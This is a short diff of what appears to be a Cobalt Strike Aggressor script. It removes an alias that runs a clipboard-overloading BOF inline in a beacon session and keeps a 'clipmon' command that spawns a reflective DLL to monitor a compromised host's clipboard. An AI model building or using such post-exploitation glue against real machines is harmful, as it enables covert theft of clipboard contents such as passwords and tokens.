@@ -59,24 +59,6 @@ beacon_command_register(
 	"Usage : overload-clip" 
 );
 
-alias overload-clip
-{
-	# figure out the arch of this session
-	$barch  = barch($1);
-
-	# read in the right BOF file
-	$handle = openf(script_resource("cobaltclip.o"));
-	$data = readb($handle, -1);
-	closef($handle);
-
-
-	# announce what we're doing
-	btask($1, "Overload the clipboard");
-	
-	# execute it.
-	beacon_inline_execute($1, $data, "overload_clipboard");
-}
-
 beacon_command_register(
 	"clipmon",
 	"Launch reflective dll has post-ex jobs to monitor the clipboard",
@@ -86,4 +68,3 @@ beacon_command_register(
 alias clipmon {
         bdllspawn($1, script_resource("clipmon.x64.dll"), $2, "Clipboard monitor", 5000, false);
 }
-
